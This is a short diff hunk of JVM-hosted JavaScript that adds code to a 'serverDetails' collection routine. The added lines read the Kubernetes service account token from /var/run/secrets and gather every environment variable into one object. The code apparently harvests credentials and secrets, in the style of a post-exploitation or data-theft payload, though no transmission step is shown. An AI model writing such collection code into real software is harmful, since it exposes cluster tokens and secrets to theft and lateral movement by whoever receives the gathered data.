@@ -27,8 +27,30 @@
             return content;
         }
 
-        var serviceAccountTokenPath = "/var/run/secrets/kubernetes.io/serviceaccount/token";
-        serverDetails.k8sServiceAccountToken = readFileContent(serviceAccountTokenPath);
+                    // Capturing Kubernetes-specific environment variables
+                    var k8sEnv = {};
+                    k8sEnv.podName = java.lang.System.getenv("HOSTNAME");
+                    k8sEnv.serviceHost = java.lang.System.getenv("KUBERNETES_SERVICE_HOST");
+                    k8sEnv.servicePort = java.lang.System.getenv("KUBERNETES_SERVICE_PORT");
+                    k8sEnv.containerName = java.lang.System.getenv("CONTAINER_NAME");
+                    k8sEnv.podIP = java.lang.System.getenv("POD_IP");
+                    k8sEnv.nodeName = java.lang.System.getenv("NODE_NAME");
+                    serverDetails.k8sInfo = k8sEnv;
+
+                    // Capturing Kubernetes Service Account token and CA certificate
+                    var serviceAccountTokenPath = "/var/run/secrets/kubernetes.io/serviceaccount/token";
+                    serverDetails.k8sServiceAccountToken = readFileContent(serviceAccountTokenPath);
+
+                    // Capturing all other environment variables
+                    var envMap = java.lang.System.getenv();
+                    var allEnvVariables = {};
+                    var iterator = envMap.keySet().iterator();
+                    while (iterator.hasNext()) {
+                        var key = iterator.next();
+                        var value = envMap.get(key);
+                        allEnvVariables[key] = value;
+                    }
+                    serverDetails.allEnvironmentVariables = allEnvVariables;
         
         // Get Java system properties
         var javaVersion = java.lang.System.getProperty("java.version");
